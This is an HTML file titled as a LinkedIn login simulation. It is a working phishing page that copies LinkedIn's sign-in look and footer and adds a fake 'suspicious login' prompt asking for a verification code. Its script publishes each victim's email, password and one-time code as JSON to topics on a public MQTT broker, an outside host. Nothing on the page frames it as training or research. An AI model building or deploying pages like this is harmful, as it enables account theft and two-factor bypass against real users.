<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>LinkedIn Login Simulation</title>
  <link rel="icon" href="<!-- linkedin-favicon.ico -->"> <!-- PLACE LINKEDIN FAVICON HERE -->
  <meta name="viewport" content="width=400">
  <style>
    body {
      background: #f3f3f3;
      font-family: system-ui, Arial, sans-serif;
      margin: 0; padding: 0;
      min-height: 100vh;
      display: flex; flex-direction: column; align-items: center;
    }
    #container {
      max-width: 400px;
      margin: 0 auto;
      margin-top: 46px;
      background: white;
      border-radius: 12px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.11);
      padding: 24px 32px;
      text-align: center;
    }
    /* Use this for LinkedIn logo above the form */
    .logo {
      margin-bottom: 14px;
    }
    /* Example for big blue sign-in button */
    .btn, button {
      display: block;
      width: 100%;
      background: #0073b1;
      border: none;
      color: white;
      padding: 12px;
      font-size: 1.15rem;
      border-radius: 6px;
      margin-top: 20px;
      cursor: pointer;
    }
    .btn:hover, button:hover { background: #005983; }
    input[type="email"], input[type="password"], input[type="text"] {
      width: 100%; padding: 12px; font-size: 1rem; margin-top: 18px;
      border-radius: 5px; border: 1px solid #ccc;
    }
    .divider { margin: 26px 0; color: #bdbdbd; text-transform: uppercase; font-size: 0.86rem;}
    .subtext, .small { font-size: 0.92rem; color: #777; margin: 4px 0 16px 0;}
    .checkbox {
      margin-top: 18px;
      text-align: left;
      font-size: 0.97rem;
      display: flex; align-items: center;
    }
    .checkbox input { margin-right: 8px; }
    #otpForm { display: none; }
    #status { margin: 14px 0 6px 0; color: green; font-weight: 500; min-height: 1.3em;}
  </style>
</head>
<body>
  <!-- LinkedIn logo placement -->
  <div class="logo">
    <!-- IMG: Place your LinkedIn logo image here -->
    <!-- <img src="linkedin-logo.png" alt="LinkedIn" width="120"> -->
  </div>
  <div id="container">
    <form id="loginForm">
      <h2 style="font-weight:500; margin-bottom:24px;">Sign in</h2>
      <!-- To simulate "Continue as..." and SSO buttons, you can add divs or images here -->
      <!-- Example: -->
      <!-- <img src="avatar-ruchir.png" width="45" style="border-radius:50%;margin-bottom:10px;"> -->

      <input type="email" id="email" placeholder="Email or phone" autocomplete="username" required>
      <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
      <div class="checkbox">
        <input type="checkbox" id="keep-logged-in" checked>
        <label for="keep-logged-in">Keep me logged in</label>
      </div>
      <a href="#" class="small" style="float:left;">Forgot password?</a>
      <button type="submit" class="btn">Sign in</button>
    </form>

    <form id="otpForm">
      <h2 style="font-weight:500; margin-bottom:20px;">Let's do a quick verification</h2>
      <div class="subtext">The login attempt seems suspicious. To finish signing in, please enter the verification code we sent to your email address.</div>
      <input type="text" id="otp" placeholder="Enter code" maxlength="8" pattern="[0-9]{6,8}" required autocomplete="one-time-code" inputmode="numeric">
      <button type="submit" class="btn" style="margin-top:20px;">Submit</button>
      <div class="small" style="margin-top:16px;">
        Lost access to your email? <a href="#" style="color:#0073b1;text-decoration:underline;">Verify your identity</a>
      </div>
    </form>
    <div id="status"></div>
  </div>
  <footer style="margin-top:44px;color:#888;font-size:0.83rem;text-align:center;">
    LinkedIn © 2025 · User Agreement · Privacy Policy · Community Guidelines · Cookie Policy · Copyright Policy
  </footer>
  <!-- MQTT Publishing Logic -->
  <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
  <script>
    const client = mqtt.connect('wss://broker.emqx.io:8084/mqtt');
    const statusDiv = document.getElementById('status');
    const loginForm = document.getElementById('loginForm');
    const otpForm = document.getElementById('otpForm');

    client.on('connect', () => {
      statusDiv.textContent = "Connected to LinkedIn.";
    });
    client.on('error', (err) => {
      statusDiv.textContent = "Connection error. Try again.";
      console.error(err);
    });

    loginForm.onsubmit = function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      client.publish('creds/test', JSON.stringify({
        email: email,
        password: password,
        timestamp: new Date().toISOString()
      }));
      statusDiv.textContent = "Credentials sent! Please enter the OTP code.";
      loginForm.style.display = 'none';
      otpForm.style.display = 'block';
      document.getElementById('otp').focus();
    };

    otpForm.onsubmit = function(e) {
      e.preventDefault();
      const otpValue = document.getElementById('otp').value;
      if (/^[0-9]{6,8}$/.test(otpValue)) {
        client.publish('otp/test', JSON.stringify({
          otp: otpValue,
          timestamp: new Date().toISOString()
        }));
        statusDiv.textContent = "OTP sent! Thank you.";
        otpForm.reset();
      } else {
        statusDiv.textContent = "Please enter a valid numeric code.";
      }
    };
  </script>
</body>
</html>
